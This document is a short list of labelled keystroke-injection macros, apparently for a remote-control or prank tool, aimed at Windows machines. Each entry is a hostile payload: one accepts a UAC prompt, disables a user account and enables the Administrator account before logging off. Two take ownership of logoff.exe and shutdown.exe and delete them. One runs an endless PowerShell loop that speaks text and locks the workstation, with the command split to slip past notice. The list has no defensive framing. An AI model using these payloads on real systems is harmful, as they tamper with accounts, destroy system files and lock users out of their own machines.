label: Add Admin User
content: !combo win+r !wait 1 !type cmd !combo ctrl+shift+enter !wait 3 !combo alt+y !wait 2 !send net user 11User /active:no !send net user Administrator /active:yes !send logoff

label: Delete Logoff (Admin User Needed)
content: ​!combo win+r !wait 1 !send cmd /k takeown /f %windir%\System32\logoff.exe /a&icacls logoff.exe /grant Everyone:F&del /s /f /q logoff.exe

label: Delete Shutdown (Admin User Needed)
content: ​!combo win+r !wait 1 !send cmd /k takeown /f %windir%\System32\shutdown.exe /a&icacls shutdown.exe /grant Everyone:F&del /s /f /q shutdown.exe

label: Soggy Eh Lock
content: !combo win+r|!wait 1|!type powershell while ($true){(new-object -co SAPI.SpVoice).Speak('soggy eh soggy eh'); ru|!type ndll32.exe us|!type er32.dll,Lo|!send ckWorkStation}
